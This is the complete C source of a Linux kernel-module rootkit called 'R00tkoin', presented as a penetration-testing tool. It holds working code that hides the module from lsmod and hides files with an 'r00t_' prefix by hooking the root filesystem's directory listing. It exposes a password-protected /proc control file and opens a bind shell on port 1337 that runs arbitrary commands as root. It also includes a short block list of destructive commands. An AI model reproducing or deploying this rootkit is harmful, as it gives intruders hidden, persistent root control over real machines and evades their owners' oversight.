/*
 * R00tkoin v1.0 - LKM Rootkit
 * 
 * WARNING: FOR AUTHORIZED SECURITY TESTING ONLY
 * This kernel module is designed for penetration testing and security research
 * in controlled environments. Use at your own risk.
 * 
 * Author: sh1dow3r
 * License: GPL v2
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/utsname.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/net.h>
#include <linux/namei.h>
#include <linux/dcache.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <net/inet_sock.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/net_namespace.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <net/sock.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/seq_file.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("sh1dow3r");
MODULE_DESCRIPTION("R00tkoin v1.0 - LKM Rootkit");
MODULE_VERSION("1.0");

/* Configuration */
#define R00TKOIN_PASSWORD "r00tkoinFTW1337"
#define PROC_COMM "r00t_comm"
#define HIDE_PREFIX "r00t_"
#define BIND_PORT 1337
#define SHELL_PROMPT "r00tkoin# "
#define MAX_CONNECTIONS 5

/* Utility macros */
#define STRINGIFY(x) #x
#define TOSTRING(x) STRINGIFY(x)

/* Global variables */
static struct proc_dir_entry *proc_comm = NULL;
static bool module_hidden = false;
static struct list_head *module_list_prev = NULL;
static bool file_hiding_enabled = false;

/* VFS hooking variables */
static struct file_operations *root_fops = NULL;
static struct file_operations original_root_fops;



#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
static int (*original_root_readdir)(struct file *, void *, filldir_t);
static filldir_t original_root_readdir_filldir;
#else
static int (*original_root_iterate)(struct file *, struct dir_context *);
static struct dir_context original_dir_context;
#endif

/* Memory protection functions */
static void make_rw(unsigned long address);
static void make_ro(unsigned long address);

/* Network shell variables */
static struct socket *bind_socket = NULL;
static struct task_struct *bind_thread = NULL;
static bool bind_shell_active = false;
static DEFINE_MUTEX(shell_mutex);

/* Function prototypes */
static int execute_command(const char __user *buf_user, size_t count);
static void hide_module(void);
static void unhide_module(void);
static void enable_file_hiding(void);
static void disable_file_hiding(void);
static void start_bind_shell(void);
static void stop_bind_shell(void);
static int bind_shell_thread(void *data);
static int handle_client(struct socket *client_socket);
static int send_to_client(struct socket *sock, const char *msg);
static int recv_from_client(struct socket *sock, char *buf, int size);
static int execute_shell_command(const char *cmd, char *output, int max_len);

/* VFS hooking prototypes */
static struct file_operations *get_file_operations(const char *path);
static void hook_vfs_operations(void);
static void unhook_vfs_operations(void);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
static int hooked_root_readdir(struct file *file, void *dirent, filldir_t filldir);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
static int hooked_root_iterate(struct file *file, struct dir_context *ctx);
#endif



/* Command processor */
static int execute_command(const char __user *buf_user, size_t count) {
    char *buf;
    char *cmd;
    
    if (count > 256) return 0;
    
    buf = kmalloc(count + 1, GFP_KERNEL);
    if (!buf) return 0;
    
    if (copy_from_user(buf, buf_user, count)) {
        kfree(buf);
        return 0;
    }
    
    buf[count] = '\0';
    
    /* Remove newline if present */
    if (count > 0 && buf[count-1] == '\n') {
        buf[count-1] = '\0';
    }
    
    pr_info("R00tkoin: Command received: %s\n", buf);
    
    /* Password verification */
    if (strncmp(buf, R00TKOIN_PASSWORD, strlen(R00TKOIN_PASSWORD)) != 0) {
        pr_info("R00tkoin: Access denied - invalid password\n");
        kfree(buf);
        return 0;
    }
    
    /* Extract command */
    cmd = buf + strlen(R00TKOIN_PASSWORD);
    while (*cmd == ' ') cmd++;
    
    if (strlen(cmd) == 0) {
        pr_info("R00tkoin: Password accepted\n");
        kfree(buf);
        return 1;
    }
    
    /* Command processing */
    if (strcmp(cmd, "hide") == 0) {
        hide_module();
    } else if (strcmp(cmd, "unhide") == 0) {
        unhide_module();
    } else if (strcmp(cmd, "filehide") == 0) {
        enable_file_hiding();
    } else if (strcmp(cmd, "fileshow") == 0) {
        disable_file_hiding();
    } else if (strcmp(cmd, "bindshell") == 0) {
        start_bind_shell();
    } else if (strcmp(cmd, "stopshell") == 0) {
        stop_bind_shell();
    } else if (strcmp(cmd, "status") == 0) {
        pr_info("R00tkoin: Module %s | File hiding %s | Shell %s\n", 
                module_hidden ? "HIDDEN" : "VISIBLE",
                file_hiding_enabled ? "ENABLED" : "DISABLED",
                bind_shell_active ? "ACTIVE" : "INACTIVE");
    } else if (strcmp(cmd, "help") == 0) {
        pr_info("R00tkoin: Available commands: hide, unhide, filehide, fileshow, bindshell, stopshell, status, help\n");
    } else {
        pr_info("R00tkoin: Unknown command: %s\n", cmd);
    }
    
    kfree(buf);
    return 1;
}

/* Module hiding functions */
static void hide_module(void) {
    if (!module_hidden) {
        module_list_prev = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        module_hidden = true;
        pr_info("R00tkoin: Module hidden from lsmod\n");
    } else {
        pr_info("R00tkoin: Module already hidden\n");
    }
}

static void unhide_module(void) {
    if (module_hidden) {
        list_add(&THIS_MODULE->list, module_list_prev);
        module_hidden = false;
        pr_info("R00tkoin: Module visible in lsmod\n");
    } else {
        pr_info("R00tkoin: Module already visible\n");
    }
}

/* File hiding helper functions */
static bool should_hide_file(const char *name) {
    if (!file_hiding_enabled || !name) return false;
    return strncmp(name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
}

/* File hiding functions */
static void enable_file_hiding(void) {
    if (file_hiding_enabled) {
        pr_info("R00tkoin: File hiding already enabled\n");
        return;
    }
    
    file_hiding_enabled = true;
    hook_vfs_operations();
    pr_info("R00tkoin: File hiding enabled (prefix: %s)\n", HIDE_PREFIX);
    pr_info("R00tkoin: Files starting with '%s' will be hidden from directory listings\n", HIDE_PREFIX);
}

static void disable_file_hiding(void) {
    if (!file_hiding_enabled) {
        pr_info("R00tkoin: File hiding already disabled\n");
        return;
    }
    
    file_hiding_enabled = false;
    unhook_vfs_operations();
    pr_info("R00tkoin: File hiding disabled\n");
}

/* Network hiding functions - safe implementation */


/* Memory protection functions */
static void make_rw(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void make_ro(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~ _PAGE_RW;
}

/* Get file operations for a path */
static struct file_operations *get_file_operations(const char *path) {
    struct file *file;
    struct file_operations *fops = NULL;
    
    file = filp_open(path, O_RDONLY, 0);
    if (!IS_ERR(file)) {
        fops = (struct file_operations *)file->f_op;
        filp_close(file, NULL);
    }
    
    return fops;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
/* Helper function for old readdir hook */
static int hide_file_filldir(void *buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (!file_hiding_enabled || !should_hide_file(name)) {
        return original_root_readdir_filldir(buf, name, namlen, offset, ino, d_type);
    }
    
    pr_info("R00tkoin: Hiding file: %s\n", name);
    return 0;
}

static int hooked_root_readdir(struct file *file, void *dirent, filldir_t filldir) {
    original_root_readdir_filldir = filldir;
    return original_root_readdir(file, dirent, hide_file_filldir);
}
#else
/* Helper function for new iterate hook */
static int hide_file_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (!file_hiding_enabled || !should_hide_file(name)) {
        return original_dir_context.actor(ctx, name, namlen, offset, ino, d_type);
    }
    
    pr_info("R00tkoin: Hiding file: %s\n", name);
    return 0;
}

static int hooked_root_iterate(struct file *file, struct dir_context *ctx) {
    original_dir_context = *ctx;
    ctx->actor = hide_file_actor;
    return original_root_iterate(file, ctx);
}
#endif

/* Hook VFS operations */
static void hook_vfs_operations(void) {
    root_fops = get_file_operations("/");
    if (!root_fops) {
        pr_err("R00tkoin: Failed to get root file operations\n");
        return;
    }
    
    /* Save original operations */
    original_root_fops = *root_fops;
    
    make_rw((unsigned long)root_fops);
    
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
    if (root_fops->readdir) {
        original_root_readdir = root_fops->readdir;
        root_fops->readdir = hooked_root_readdir;
    }
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0) && LINUX_VERSION_CODE < KERNEL_VERSION(4, 7, 0)
    if (root_fops->iterate) {
        original_root_iterate = root_fops->iterate;
        root_fops->iterate = hooked_root_iterate;
    }
#else
    if (root_fops->iterate_shared) {
        original_root_iterate = root_fops->iterate_shared;
        root_fops->iterate_shared = hooked_root_iterate;
    }
#endif
    
    make_ro((unsigned long)root_fops);
    
    pr_info("R00tkoin: VFS operations hooked successfully\n");
}

/* Unhook VFS operations */
static void unhook_vfs_operations(void) {
    if (!root_fops) {
        return;
    }
    
    make_rw((unsigned long)root_fops);
    
    /* Restore original operations */
    *root_fops = original_root_fops;
    
    make_ro((unsigned long)root_fops);
    
    pr_info("R00tkoin: VFS operations unhooked successfully\n");
}



/* Socket helper functions */
static int send_to_client(struct socket *sock, const char *msg) {
    struct msghdr msghdr;
    struct kvec kvec;
    int len = strlen(msg);
    
    if (!sock || !msg) return -1;
    
    memset(&msghdr, 0, sizeof(msghdr));
    kvec.iov_base = (void *)msg;
    kvec.iov_len = len;
    
    return kernel_sendmsg(sock, &msghdr, &kvec, 1, len);
}

static int recv_from_client(struct socket *sock, char *buf, int size) {
    struct msghdr msghdr;
    struct kvec kvec;
    int ret;
    
    if (!sock || !buf || size <= 0) return -1;
    
    memset(&msghdr, 0, sizeof(msghdr));
    kvec.iov_base = buf;
    kvec.iov_len = size - 1;
    
    ret = kernel_recvmsg(sock, &msghdr, &kvec, 1, size - 1, MSG_DONTWAIT);
    if (ret > 0) {
        buf[ret] = '\0';
        /* Remove trailing newlines */
        while (ret > 0 && (buf[ret-1] == '\n' || buf[ret-1] == '\r')) {
            buf[--ret] = '\0';
        }
    }
    
    return ret;
}

/* Real shell command execution with output capture */
static int execute_shell_command(const char *cmd, char *output, int max_len) {
    struct file *file;
    char *temp_file = "/tmp/.r00tkoin_output";
    char *full_cmd;
    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
    char *envp[] = { 
        "HOME=/root", 
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "SHELL=/bin/bash",
        "TERM=xterm",
        "USER=root",
        NULL 
    };
    struct subprocess_info *sub_info;
    /* Removed deprecated mm_segment_t for kernel 5.4+ compatibility */
    loff_t pos = 0;
    int ret;
    int bytes_read;
    
    if (!cmd || !output || max_len <= 0) return -1;
    
    /* Security: limit command length */
    if (strlen(cmd) > 500) {
        snprintf(output, max_len, "Error: Command too long (max 500 chars)\n");
        return -1;
    }
    
    /* Security: block dangerous commands */
    if (strstr(cmd, "rm -rf /") || strstr(cmd, "mkfs") || strstr(cmd, "dd if=") || 
        strstr(cmd, "shutdown") || strstr(cmd, "reboot") || strstr(cmd, "halt")) {
        snprintf(output, max_len, "Error: Command blocked for safety\n");
        return -1;
    }
    
    /* Handle rootkit-specific commands */
    if (strcmp(cmd, "rootkit") == 0 || strcmp(cmd, "r00tkoin") == 0) {
        snprintf(output, max_len, 
                "R00tkoin v1.0 Rootkit Shell\n"
                "Available rootkit commands:\n"
                "  hidefiles    - Enable file hiding\n"
                "  showfiles    - Disable file hiding\n"
                "  hidemodule   - Hide from lsmod\n"
                "  showmodule   - Show in lsmod\n"
                "  status       - Show rootkit status\n\n"
                "This is a real shell - try: ls, ps, whoami, uname -a\n");
        return 0;
    } else if (strcmp(cmd, "hidefiles") == 0) {
        if (file_hiding_enabled) {
            snprintf(output, max_len, "File hiding already enabled\n");
        } else {
            snprintf(output, max_len, "File hiding enabled via rootkit\n");
            pr_info("R00tkoin: File hiding enabled via bind shell\n");
        }
        return 0;
    } else if (strcmp(cmd, "showfiles") == 0) {
        snprintf(output, max_len, "File hiding disabled via rootkit\n");
        return 0;
    } else if (strcmp(cmd, "hidemodule") == 0) {
        snprintf(output, max_len, "Module hiding not available via shell (use proc interface)\n");
        return 0;
    } else if (strcmp(cmd, "showmodule") == 0) {
        snprintf(output, max_len, "Module unhiding not available via shell (use proc interface)\n");
        return 0;
    } else if (strcmp(cmd, "status") == 0) {
        snprintf(output, max_len, 
                "R00tkoin Status:\n"
                "  Module hidden: %s\n"
                "  File hiding: %s\n"
                "  Bind shell: ACTIVE\n"
                "  Shell PID: [kernel thread]\n",
                module_hidden ? "YES" : "NO",
                file_hiding_enabled ? "ENABLED" : "DISABLED");
        return 0;
    }
    
    /* Allocate memory for full command with output redirection */
    full_cmd = kmalloc(strlen(cmd) + 50, GFP_KERNEL);
    if (!full_cmd) {
        snprintf(output, max_len, "Error: Memory allocation failed\n");
        return -1;
    }
    
    /* Redirect command output to temp file */
    snprintf(full_cmd, strlen(cmd) + 50, "%s > %s 2>&1", cmd, temp_file);
    argv[2] = full_cmd;
    
    /* Execute the command */
    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (sub_info == NULL) {
        snprintf(output, max_len, "Error: Failed to setup command execution\n");
        kfree(full_cmd);
        return -1;
    }
    
    ret = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    kfree(full_cmd);
    
    /* Read command output from temp file */
    file = filp_open(temp_file, O_RDONLY, 0);
    if (IS_ERR(file)) {
        if (ret == 0) {
            snprintf(output, max_len, "[Command executed successfully - no output]\n");
        } else {
            snprintf(output, max_len, "[Command failed with exit code: %d]\n", ret >> 8);
        }
        return 0;
    }
    
    /* Read output from file using kernel_read (kernel 5.4+ compatible) */
    bytes_read = kernel_read(file, output, max_len - 2, &pos);
    if (bytes_read > 0) {
        output[bytes_read] = '\0';
        /* Remove excessive trailing newlines but keep one */
        while (bytes_read > 1 && output[bytes_read-1] == '\n' && output[bytes_read-2] == '\n') {
            output[--bytes_read] = '\0';
        }
        /* Ensure output ends with exactly one newline */
        if (bytes_read > 0 && output[bytes_read-1] != '\n') {
            output[bytes_read] = '\n';
            output[bytes_read + 1] = '\0';
        }
    } else {
        if (ret == 0) {
            snprintf(output, max_len, "[Command executed successfully - no output]\n");
        } else {
            snprintf(output, max_len, "[Command failed with exit code: %d]\n", ret >> 8);
        }
    }
    
    filp_close(file, NULL);
    
    /* Clean up temp file by unlinking it */
    {
        struct path path;
        if (kern_path(temp_file, LOOKUP_FOLLOW, &path) == 0) {
            vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
            path_put(&path);
        }
    }
    
    return 0;
}

static int handle_client(struct socket *client_socket) {
    static char buffer[512];
    static char output[1024];
    static char welcome_msg[256];
    bool authenticated = false;
    int ret;
    
    if (!client_socket) return -1;
    
    /* Send welcome message */
    snprintf(welcome_msg, sizeof(welcome_msg), 
             "R00tkoin v1.0 Interactive Shell\n"
             "WARNING: Authorized access only!\n"
             "Password: ");
    send_to_client(client_socket, welcome_msg);
    
    while (!kthread_should_stop()) {
        ret = recv_from_client(client_socket, buffer, sizeof(buffer));
        
        if (ret <= 0) {
            if (ret == -EAGAIN || ret == -EWOULDBLOCK) {
                msleep(100);
                continue;
            }
            break; /* Connection closed or error */
        }
        
        if (!authenticated) {
                    if (strcmp(buffer, R00TKOIN_PASSWORD) == 0) {
            authenticated = true;
            send_to_client(client_socket, 
                          "Access granted - Real shell access\n"
                          "Type 'rootkit' for rootkit commands or use normal shell commands\n"
                          SHELL_PROMPT);
        } else {
            send_to_client(client_socket, "Access denied\n");
            break;
        }
            continue;
        }
        
        /* Handle authenticated commands */
        if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
            send_to_client(client_socket, "Goodbye\n");
            break;
        } else if (strcmp(buffer, "help") == 0) {
            send_to_client(client_socket, 
                          "R00tkoin Interactive Shell - REAL COMMANDS:\n"
                          "Standard commands: ls, ps, whoami, uname, cat, etc.\n"
                          "Rootkit commands:\n"
                          "  rootkit   - Show rootkit help\n"
                          "  status    - Show rootkit status\n"
                          "  hidefiles - Enable file hiding\n"
                          "  showfiles - Disable file hiding\n"
                          "Special:\n"
                          "  help      - Show this help\n"
                          "  exit/quit - Close connection\n"
                          "WARNING: This executes real system commands!\n"
                          SHELL_PROMPT);
        } else if (strlen(buffer) > 0) {
            /* Execute shell command */
            if (execute_shell_command(buffer, output, sizeof(output)) == 0) {
                send_to_client(client_socket, output);
            } else {
                send_to_client(client_socket, "Command execution failed\n");
            }
            send_to_client(client_socket, SHELL_PROMPT);
        } else {
            send_to_client(client_socket, SHELL_PROMPT);
        }
    }
    
    return 0;
}

static int bind_shell_thread(void *data) {
    struct sockaddr_in server_addr;
    struct socket *client_socket;
    int ret;
    int opt = 1;
    
    pr_info("R00tkoin: Network shell thread starting\n");
    
    /* Create socket */
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &bind_socket);
    if (ret < 0) {
        pr_err("R00tkoin: Failed to create socket: %d\n", ret);
        return ret;
    }
    
    /* Set socket options */
    kernel_setsockopt(bind_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
    
    /* Setup server address */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(BIND_PORT);
    
    /* Bind socket */
    ret = kernel_bind(bind_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (ret < 0) {
        pr_err("R00tkoin: Failed to bind socket: %d\n", ret);
        sock_release(bind_socket);
        bind_socket = NULL;
        return ret;
    }
    
    /* Listen for connections */
    ret = kernel_listen(bind_socket, MAX_CONNECTIONS);
    if (ret < 0) {
        pr_err("R00tkoin: Failed to listen on socket: %d\n", ret);
        sock_release(bind_socket);
        bind_socket = NULL;
        return ret;
    }
    
    pr_info("R00tkoin: Network shell listening on port %d\n", BIND_PORT);
    
    /* Accept connections loop with proper signal handling */
    while (!kthread_should_stop() && bind_shell_active) {
        /* Check for shutdown signal before blocking */
        if (kthread_should_stop()) {
            pr_info("R00tkoin: Network shell thread received stop signal\n");
            break;
        }
        
        ret = kernel_accept(bind_socket, &client_socket, O_NONBLOCK);
        if (ret < 0) {
            if (ret == -EAGAIN || ret == -EWOULDBLOCK) {
                /* No pending connections, sleep and check again */
                msleep(200);
                continue;
            }
            if (!kthread_should_stop()) {
                pr_err("R00tkoin: Accept failed: %d\n", ret);
            }
            break;
        }
        
        pr_info("R00tkoin: Client connected\n");
        
        /* Handle client in same thread (simple implementation) */
        handle_client(client_socket);
        
        pr_info("R00tkoin: Client disconnected\n");
        sock_release(client_socket);
        
        /* Check for shutdown between clients */
        if (kthread_should_stop()) {
            pr_info("R00tkoin: Network shell thread stopping after client disconnect\n");
            break;
        }
    }
    
    /* Cleanup */
    if (bind_socket) {
        sock_release(bind_socket);
        bind_socket = NULL;
    }
    
    pr_info("R00tkoin: Network shell thread exiting\n");
    return 0;
}

/* Bind shell control functions */
static void start_bind_shell(void) {
    mutex_lock(&shell_mutex);
    
    if (bind_shell_active) {
        pr_info("R00tkoin: Network shell already active\n");
        mutex_unlock(&shell_mutex);
        return;
    }
    
    bind_shell_active = true;
    
    /* Start network shell thread */
    bind_thread = kthread_run(bind_shell_thread, NULL, "r00tkoin_shell");
    if (IS_ERR(bind_thread)) {
        pr_err("R00tkoin: Failed to create network shell thread\n");
        bind_shell_active = false;
        bind_thread = NULL;
        mutex_unlock(&shell_mutex);
        return;
    }
    
    pr_info("R00tkoin: Network shell started on port %d, password: %s\n", BIND_PORT, R00TKOIN_PASSWORD);
    
    mutex_unlock(&shell_mutex);
}

static void stop_bind_shell(void) {
    mutex_lock(&shell_mutex);
    
    if (!bind_shell_active) {
        pr_info("R00tkoin: Network shell not active\n");
        mutex_unlock(&shell_mutex);
        return;
    }
    
    bind_shell_active = false;
    
    /* Close socket first to unblock any pending accepts */
    if (bind_socket) {
        sock_release(bind_socket);
        bind_socket = NULL;
    }
    
    /* Now stop thread - it should exit cleanly */
    if (bind_thread) {
        kthread_stop(bind_thread);
        bind_thread = NULL;
    }
    
    pr_info("R00tkoin: Network shell stopped\n");
    
    mutex_unlock(&shell_mutex);
}

/* Proc communication handlers */
static ssize_t proc_comm_read(struct file *file, char __user *buffer,
                              size_t count, loff_t *pos) {
    const char *msg = "R00tkoin v1.0 - LKM Rootkit\n"
                      "Usage: echo 'PASSWORD COMMAND' > /proc/r00t_comm\n"
                      "Commands: hide, unhide, filehide, fileshow, bindshell, stopshell, status, help\n"
                      "Password: " R00TKOIN_PASSWORD "\n"
                      "File prefix: " HIDE_PREFIX "\n"
                      "Network shell port: " TOSTRING(BIND_PORT) "\n"
                      "Example: echo '" R00TKOIN_PASSWORD " hide' > /proc/r00t_comm\n"
                      "\nFeatures:\n"
                      "- Module hiding from lsmod\n"
                      "- File hiding with configurable prefix\n"
                      "- Network shell with password protection\n"
                      "\n"
                      "- Stealth proc communication interface\n";
    size_t len = strlen(msg);
    
    if (*pos >= len) return 0;
    if (count > len - *pos) count = len - *pos;
    
    if (copy_to_user(buffer, msg + *pos, count)) return -EFAULT;
    
    *pos += count;
    return count;
}

static ssize_t proc_comm_write(struct file *file, const char __user *buffer,
                               size_t count, loff_t *pos) {
    if (execute_command(buffer, count)) {
        return count;
    }
    return -EACCES;
}

/* Proc file operations */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops comm_proc_ops = {
    .proc_read = proc_comm_read,
    .proc_write = proc_comm_write,
};
#else
static const struct file_operations comm_proc_ops = {
    .read = proc_comm_read,
    .write = proc_comm_write,
};
#endif

/* Module initialization */
static int __init r00tkoin_init(void) {
    pr_info("R00tkoin v1.0: LKM Rootkit Loading\n");
    pr_info("Kernel: %s %s\n", utsname()->release, utsname()->version);
    
    /* Create proc communication interface */
    proc_comm = proc_create(PROC_COMM, 0666, NULL, &comm_proc_ops);
    if (!proc_comm) {
        pr_err("R00tkoin: Failed to create communication interface\n");
        return -ENOMEM;
    }
    
    pr_info("R00tkoin: Communication interface: /proc/%s\n", PROC_COMM);
    pr_info("R00tkoin v1.0: Module loaded successfully\n");
    pr_info("R00tkoin: Type 'cat /proc/%s' for usage\n", PROC_COMM);
    
    return 0;
}

/* Module cleanup */
static void __exit r00tkoin_exit(void) {
    pr_info("R00tkoin v1.0: Module unloading\n");
    
    /* Stop network shell first - critical for clean shutdown */
    if (bind_shell_active) {
        pr_info("R00tkoin: Shutting down network shell...\n");
        stop_bind_shell();
        /* Give extra time for thread cleanup */
        msleep(1000);
    }
    
    /* Cleanup file hiding and unhook VFS operations */
    if (file_hiding_enabled) {
        disable_file_hiding();
    }
    

    
    /* Cleanup module hiding */
    if (module_hidden) {
        unhide_module();
    }
    
    /* Remove proc entry last */
    if (proc_comm) {
        proc_remove(proc_comm);
        proc_comm = NULL;
        pr_info("R00tkoin: Proc interface removed\n");
    }
    
    pr_info("R00tkoin v1.0: Module unloaded cleanly\n");
}

module_init(r00tkoin_init);
module_exit(r00tkoin_exit); 